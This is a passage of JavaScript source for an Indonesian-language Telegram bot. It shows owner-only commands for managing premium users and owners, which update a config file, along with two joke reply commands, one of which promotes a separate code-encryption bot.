┃女 𝙽𝚊𝚖𝚎 : 𝚉𝚎𝚗𝚒𝚝𝚑 𝙾𝚏 𝚃𝚑𝚎 𝚂𝚎𝚟𝚎𝚗𝚝𝚑
┃女 𝚅𝚎𝚛𝚜𝚒𝚘𝚗 : 𝟷𝟶 𝙾𝚠𝚗𝚎𝚛-𝙾𝚗𝚕𝚢
┃女 𝙳𝚎𝚟𝚎𝚕𝚘𝚙𝚎𝚛 : 𝚂𝚎𝚟𝚎𝚗𝚝𝚑 
┃女 𝚄𝚜𝚎𝚛 : ${chatId}
┃女 𝚄𝚜𝚎𝚛 𝙸𝙳 : ${senderId}
┃女 𝚁𝚞𝚗𝚝𝚒𝚖𝚎 : ${waktuRunPanel}
╰━━━━━━━━━━━━━━━━━━⭓\`\`\``;
        buttons = mainMenuButtons;
        break;
        
    }

    await bot.editMessageCaption(caption, {
      chat_id: chatId,
      message_id: messageId,
      parse_mode: "Markdown",
      ...buttons,
    });
  } catch (error) {
    console.error("Error handling callback query:", error);
    await bot.sendMessage(chatId, caption, {
      parse_mode: "Markdown",
      ...buttons,
    });
  }
});

bot.onText(/\/addprem (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  if (!isOwner(msg.from.id)) {
    return bot.sendMessage(
      chatId,
      "⚠️ akses Ditolak\nAnda tidak memiliki izin untuk menggunakan command ini.",
      {
        parse_mode: "Markdown",
      }
    );
  }

  const userId = match[1].trim();

  try {
    const premiumUsers = loadPremiumUsers();

    if (premiumUsers.includes(userId)) {
      return bot.sendMessage(
        chatId,
        `
╭─────────────────
│    GAGAL MENAMBAHKAN    
│────────────────
│ User ${userId} sudah
│ terdaftar sebagai premium
╰─────────────────`,
        {
          parse_mode: "Markdown",
        }
      );
    }

    premiumUsers.push(userId);
    savePremiumUsers(premiumUsers);

    await bot.sendMessage(
      chatId,
      `
╭─────────────────
│    BERHASIL MENAMBAHKAN
│────────────────
│ ID: ${userId}
│ Status: Premium User
╰─────────────────`,
      {
        parse_mode: "Markdown",
      }
    );
  } catch (error) {
    console.error("Error adding premium user:", error);
    await bot.sendMessage(
      chatId,
      "❌ Terjadi kesalahan saat menambahkan user premium. Silakan coba lagi.",
      {
        parse_mode: "Markdown",
      }
    );
  }
});

bot.onText(/\/delprem (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  if (!isOwner(msg.from.id)) {
    return bot.sendMessage(
      chatId,
      "⚠️ akses Ditolak\nAnda tidak memiliki izin untuk menggunakan command ini.",
      {
        parse_mode: "Markdown",
      }
    );
  }

  const userId = match[1].trim();

  try {
    const premiumUsers = loadPremiumUsers();
    const index = premiumUsers.indexOf(userId);

    if (index === -1) {
      return bot.sendMessage(
        chatId,
        `
╭─────────────────
│    GAGAL MENGHAPUS
│────────────────
│ User ${userId} tidak
│ terdaftar sebagai premium
╰─────────────────`,
        {
          parse_mode: "Markdown",
        }
      );
    }

    premiumUsers.splice(index, 1);
    savePremiumUsers(premiumUsers);

    await bot.sendMessage(
      chatId,
      `
╭─────────────────
│    BERHASIL MENGHAPUS  
│────────────────
│ ID: ${userId}
│ Status: User Biasa
╰─────────────────`,
      {
        parse_mode: "Markdown",
      }
    );
  } catch (error) {
    console.error("Error removing premium user:", error);
    await bot.sendMessage(
      chatId,
      "❌ Terjadi kesalahan saat menghapus user premium. Silakan coba lagi.",
      {
        parse_mode: "Markdown",
      }
    );
  }
});

bot.onText(/\/addowner (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  if (!isOwner(msg.from.id)) {
    return bot.sendMessage(
      chatId,
      "⚠️ akses Ditolak\nAnda tidak memiliki izin untuk menggunakan command ini.",
      {
        parse_mode: "Markdown",
      }
    );
  }

  const newOwnerId = match[1].trim();

  try {
    const configPath = "./config.js";
    const configContent = fs.readFileSync(configPath, "utf8");

    if (config.OWNER_ID.includes(newOwnerId)) {
      return bot.sendMessage(
        chatId,
        `
╭─────────────────
│    GAGAL MENAMBAHKAN    
│────────────────
│ User ${newOwnerId} sudah
│ terdaftar sebagai owner
╰─────────────────`,
        {
          parse_mode: "Markdown",
        }
      );
    }

    config.OWNER_ID.push(newOwnerId);

    const newContent = `module.exports = {
      BOT_TOKEN: "${config.BOT_TOKEN}",
      OWNER_ID: ${JSON.stringify(config.OWNER_ID)},
    };`;

    fs.writeFileSync(configPath, newContent);

    await bot.sendMessage(
      chatId,
      `
╭─────────────────
│    BERHASIL MENAMBAHKAN    
│────────────────
│ ID: ${newOwnerId}
│ Status: Owner Bot
╰─────────────────`,
      {
        parse_mode: "Markdown",
      }
    );
  } catch (error) {
    console.error("Error adding owner:", error);
    await bot.sendMessage(
      chatId,
      "❌ Terjadi kesalahan saat menambahkan owner. Silakan coba lagi.",
      {
        parse_mode: "Markdown",
      }
    );
  }
});

bot.onText(/\/delowner (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  if (!isOwner(msg.from.id)) {
    return bot.sendMessage(
      chatId,
      "⚠️ akses Ditolak\nAnda tidak memiliki izin untuk menggunakan command ini.",
      {
        parse_mode: "Markdown",
      }
    );
  }

  const ownerIdToRemove = match[1].trim();

  try {
    const configPath = "./config.js";

    if (!config.OWNER_ID.includes(ownerIdToRemove)) {
      return bot.sendMessage(
        chatId,
        `
╭─────────────────
│    GAGAL MENGHAPUS    
│────────────────
│ User ${ownerIdToRemove} tidak
│ terdaftar sebagai owner
╰─────────────────`,
        {
          parse_mode: "Markdown",
        }
      );
    }

    config.OWNER_ID = config.OWNER_ID.filter((id) => id !== ownerIdToRemove);

    const newContent = `module.exports = {
      BOT_TOKEN: "${config.BOT_TOKEN}",
      OWNER_ID: ${JSON.stringify(config.OWNER_ID)},
    };`;

    fs.writeFileSync(configPath, newContent);

    await bot.sendMessage(
      chatId,
      `
╭─────────────────
│    BERHASIL MENGHAPUS    
│────────────────
│ ID: ${ownerIdToRemove}
│ Status: User Biasa
╰─────────────────`,
      {
        parse_mode: "Markdown",
      }
    );
  } catch (error) {
    console.error("Error removing owner:", error);
    await bot.sendMessage(
      chatId,
      "❌ Terjadi kesalahan saat menghapus owner. Silakan coba lagi.",
      {
        parse_mode: "Markdown",
      }
    );
  }
});
bot.onText(/\/siapa yang ciptain kamu?/, (msg) => {
  const chatId = msg.chat.id;
  bot.sendMessage(chatId, `𝙷𝙼 𝙿𝙴𝚁𝚃𝙰𝙽𝚈𝙰𝙰𝙽 𝙱𝙰𝙶𝚄𝚂 😁
  𝚈𝙰𝙽𝙶 𝙱𝚄𝙰𝚃 𝙰𝙺𝚄 𝙰𝙳𝙰𝙻𝙰𝙷 𝚂𝙴𝚅𝙴𝙽/𝙽𝙿𝙲 𝙳𝙸𝙰 𝙱𝚄𝙰𝚃 𝙰𝙺𝚄 𝙺𝙰𝚁𝙽𝙰 𝙶𝙰𝙱𝚄𝚃 𝙺𝙰𝙻𝙾 𝙶𝙰 𝙶𝙰𝙱𝚄𝚃 𝙳𝙸𝙰 𝙶𝙰 𝙱𝙰𝙺𝙰𝙻 𝙱𝚄𝙰𝚃 𝙰𝙺𝚄 😁🤭`);  
});
bot.onText(/\/SevenEnc/, (msg) => {
  const chatId = msg.chat.id;
  bot.sendMessage(chatId, `𝙸𝙽𝙸 𝙱𝙾𝚃 𝙴𝙽𝙲 𝙶𝚆 𝙿𝙸𝚂𝙰𝙷 𝚈𝙰, 𝙺𝙰𝙻𝙾 𝙳𝙸 𝙶𝙰𝙱𝚄𝙽𝙶 𝙰𝙼𝙰 𝙱𝙾𝚃 𝙸𝙽𝙸 𝙹𝙰𝙳𝙸 𝙴𝚁𝚁𝙾𝚁 𝙲𝚄𝚈 + 𝙺𝙴𝙱𝙰𝙽𝚈𝙰𝙺𝙰𝙽 𝙵𝚄𝙽𝙲𝚃𝙸𝙾𝙽 𝙹𝙰𝙳𝙸 𝙶𝚆 𝙿𝙸𝚂𝙰𝙷 𝙳𝙴𝙷, 𝙺𝙰𝙻𝙾 𝙼𝙰𝚄 𝙴𝙽𝙲 𝙱𝙸𝚂𝙰 𝙺𝙴𝚃𝙸𝙺 /SevenEnc 𝙰𝚃𝙰𝚄 𝙺𝙴 𝙱𝙾𝚃 𝙽𝚈𝙰 𝙻𝙰𝙽𝙶𝚂𝚄𝙽𝙶 t.me/EncByNpc_bot`);  
});